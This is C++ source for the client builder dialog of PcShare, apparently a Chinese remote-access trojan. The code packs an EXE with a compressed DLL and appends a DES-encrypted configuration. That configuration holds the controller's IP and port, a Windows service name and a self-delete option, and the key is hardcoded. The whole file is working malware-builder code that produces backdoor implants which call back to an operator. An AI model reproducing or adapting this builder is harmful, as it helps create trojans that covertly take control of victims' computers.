// MyCreateClientDlg.cpp : implementation file
//

#include "stdafx.h"
#include "PcShare.h"
#include "Lzw.h"
#include ".\mycreateclientdlg.h"
#include "WjcDes.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern GOLBALVALUE m_MainValue ;

/////////////////////////////////////////////////////////////////////////////
// CMyCreateClientDlg dialog

CMyCreateClientDlg::CMyCreateClientDlg()
: CDialog(CMyCreateClientDlg::IDD, NULL)
{
	//{{AFX_DATA_INIT(CMyCreateClientDlg)
	m_Port = _T("");
	m_CtrlFile = _T("");
	m_Proc = 0;
	m_servicename = _T("");
	m_servicemark = _T("");
	m_servicedisplayname = _T("");
	m_bDelete = TRUE;
	//}}AFX_DATA_INIT
}

void CMyCreateClientDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CMyCreateClientDlg)
	DDX_Control(pDX, IDC_COMBO_IPLIST, m_IpList);
	DDX_Text(pDX, IDC_EDIT_PORT, m_Port);
	DDV_MaxChars(pDX, m_Port, 5);
	DDX_Text(pDX, IDC_EDIT_CONTROL_DLL, m_CtrlFile);
	DDV_MaxChars(pDX, m_CtrlFile, 250);
	DDX_CBIndex(pDX, IDC_COMBO_PROC, m_Proc);
	DDX_Text(pDX, IDC_SERVICENAME, m_servicename);
	DDX_Text(pDX, IDC_SERVICEMARK, m_servicemark);
	DDX_Text(pDX, IDC_SERVIECEDISPLAY, m_servicedisplayname);
	DDX_Check(pDX, IDC_BDELETESELF, m_bDelete);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CMyCreateClientDlg, CDialog)
	//{{AFX_MSG_MAP(CMyCreateClientDlg)
	ON_BN_CLICKED(IDC_BUTTON_CREATE, OnButtonCreate)
	//}}AFX_MSG_MAP
	
	
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMyCreateClientDlg message handlers

BOOL CMyCreateClientDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();

	char m_IniFileName[256] = {0};
	GetIniFileName(m_IniFileName);

	char m_sMainPort[20] = {0};
	GetPrivateProfileString("设置","自动上线连接端口",
		"80",m_sMainPort,10,m_IniFileName);
	m_Port = m_sMainPort;

	char m_sCtrlName[256] = {0};
	GetPrivateProfileString("设置","控制DLL文件",
		"PcCortr.dll",m_sCtrlName,255,m_IniFileName);
	m_CtrlFile = m_sCtrlName;

	GetDlgItem(IDC_COMBO_IPLIST)->EnableWindow(TRUE);
	GetDlgItem(IDC_EDIT_PORT)->EnableWindow(TRUE);
	
	m_servicename = "默认(serviceofmine)";
	m_servicedisplayname = "默认(serviceofmine)";
	m_servicemark = "默认(serviceofmine)";
	UpdateData(false);

	//取IP地址信息
	PHOSTENT hostinfo;
	char name[512] = {0};
	if(gethostname (name,sizeof(name)) != 0 ||
		(hostinfo = gethostbyname(name)) == NULL)
		return TRUE;
	
	struct sockaddr_in dest;
	for(int i=0; hostinfo->h_addr_list[i] != NULL ;i++)
	{
		memcpy(&(dest.sin_addr), 
			hostinfo->h_addr_list[i],
			hostinfo->h_length);
		m_IpList.AddString(inet_ntoa(dest.sin_addr));
	}
	m_IpList.SetCurSel(0);
	return TRUE;  
}

void CMyCreateClientDlg::OnButtonCreate() 
{
	UpdateData();
	char m_IniFileName[256] = {0};
	GetIniFileName(m_IniFileName);
	WritePrivateProfileString("设置","控制DLL文件",
		m_CtrlFile,m_IniFileName);

	//取目标文件名称
	CString szFilter = "可执行文件(*.exe)|*.exe|";
	CFileDialog *pDlg = new CFileDialog(FALSE,NULL,"Ps.exe",
		OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT,szFilter,this);
	if(pDlg)
	{
		if (pDlg->DoModal() != IDOK) return;
		m_StartFile = pDlg->GetFileName();
		delete pDlg;
		pDlg = NULL;
	}

	//取EXE文件和DLL文件名称
	char m_ExeFileName[512] = "PcStat.exe";
	GetMyFilePath(m_ExeFileName);
	char m_DllFileName[512] = "PcClient.dll";
	GetMyFilePath(m_DllFileName);
	BYTE* pExeFileData = NULL;
	BYTE* pDllFileData = NULL;
	DWORD m_ExeSize = 0;
	DWORD m_DllSize = 0;

	//取EXE文件数据
	CFile m_File;
	if(!m_File.Open(m_ExeFileName,CFile::modeRead))
	{
		MessageBox("缺少文件pcstat.exe","错误");
		return;
	}
	m_ExeSize = m_File.GetLength();
	pExeFileData = new BYTE[m_ExeSize];
	m_File.Read(pExeFileData,m_ExeSize);
	m_File.Close();

	//取DLL文件数据
	if(!m_File.Open(m_DllFileName,CFile::modeRead))
	{
		delete [] pExeFileData;
		MessageBox("缺少文件pcclient.dll","错误");
		return;
	}
	m_DllSize = m_File.GetLength();
	pDllFileData = new BYTE[m_DllSize];
	m_File.Read(pDllFileData,m_DllSize);
	m_File.Close();

	//压缩数据
	BYTE* pDest = new BYTE[m_DllSize * 2];
	memset(pDest , 0 , m_DllSize * 2); //内存里面的数据置成某个数值

	BYTE* pSrc = pDllFileData;
	BYTE* pCurr = pDest;

	//写头
	::lstrcpyA ((char*)pDest, "SSH") ; //复制"SSH"字符串到缓冲区
	pCurr += 8 ;
	* (WORD *) pCurr = 16 ;
	pCurr += 2 ;
	* (WORD *) pCurr = 0 ;
	pCurr += 2 ;
	* (DWORD *) pCurr = m_DllSize ;
	pCurr += 4 ;
	pCurr += 8 ;
	// 文件名
	* (WORD *) pCurr = ::lstrlen (m_StartFile) ;
	::lstrcpy ((char *) pCurr+2, m_StartFile) ;
	pCurr += * (WORD *) pCurr + 2 ;

	//压缩
	DWORD dwCounter = ::GetTickCount () ;
	FCLzw fLzw ;
	pCurr += fLzw.LZW_Encode (pSrc, m_DllSize, pCurr) ;
	dwCounter = ::GetTickCount () - dwCounter ;
	* (DWORD *) &pDest[16] = dwCounter ;

	//启动信息
	INITDLLINFO m_InitInfo = {0};

	m_IpList.GetWindowText(m_InitInfo.m_ServerAddr,50);
	strcpy(m_InitInfo.m_CtrlFile,m_CtrlFile);
	m_InitInfo.m_ProcessName[0] = m_Proc;

	strcpy(m_InitInfo.m_StartFile,m_StartFile);
	m_InitInfo.m_StartFile[m_StartFile.GetLength() - 4] = 0;
	strcpy(m_InitInfo.m_KeyName,m_InitInfo.m_StartFile);
	m_InitInfo.m_KeyName[m_StartFile.GetLength() - 1] = 0;
	strcat(m_InitInfo.m_StartFile, ".dll");
	m_InitInfo.m_ServerPort = (WORD) (atoi((LPCTSTR) m_Port));
	m_InitInfo.m_DllFileLen = pCurr - pDest;
	strcpy(m_InitInfo.m_serviceName,m_servicename);
	strcpy(m_InitInfo.m_serviceMark,m_servicemark);
    strcpy(m_InitInfo.m_serviceDisplayname,m_servicedisplayname);	
 
	m_InitInfo.m_bDelete= m_bDelete;
	//DES加密信息
	INITDLLINFO m_InitFileInfo = {0};
	char m_DesKey[9] = "\x10\x20\x17\x10\x09\x55\x11\xeb";
	Des_Go((char*) &m_InitFileInfo, (char*) &m_InitInfo, 
		sizeof(INITDLLINFO), m_DesKey, 8, ENCRYPT);//加密

	//创建目标文件
	if(!m_File.Open(m_StartFile, CFile::modeCreate|CFile::modeWrite))
	{
		delete [] pExeFileData;
		delete [] pDllFileData;
		delete [] pDest;
		MessageBox("无法创建文件","错误");
		return;
	}
	m_File.Write(pExeFileData,m_ExeSize);
	m_File.Write(pDest,m_InitInfo.m_DllFileLen);
	m_File.Write(&m_InitFileInfo,sizeof(INITDLLINFO));
	m_File.Close();
    
	delete [] pExeFileData;
	delete [] pDllFileData;
	delete [] pDest;

	MessageBox("创建成功！", "提示");
}


